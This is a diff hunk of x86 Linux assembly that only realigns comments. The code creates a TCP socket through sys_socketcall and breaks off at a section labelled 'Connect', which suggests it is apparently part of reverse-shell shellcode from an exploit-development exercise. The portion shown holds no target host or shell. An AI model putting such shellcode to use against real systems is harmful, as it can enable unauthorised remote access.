@@ -14,13 +14,13 @@ _start:
   ; Create socket
   xor    ebx,ebx	; zero out ebx
   mul    ebx		; zero out eax & edx
-  push   ebx        ; push IPPROTO = 0
+  push   ebx            ; push IPPROTO = 0
   inc    ebx
-  push   ebx        ; push SOCK_STREAM=1
-  push   0x2        ; push AF_INET=2
+  push   ebx            ; push SOCK_STREAM=1
+  push   0x2            ; push AF_INET=2
   mov    al,0x66	; store sys_socketcall system call number in al
   mov    ecx,esp	; store pointer to arguments in ecx
-  int    0x80       ; invoke system call
+  int    0x80           ; invoke system call
   xchg   edi,eax	; store the socket file descriptor in esi
 
   ; Connect
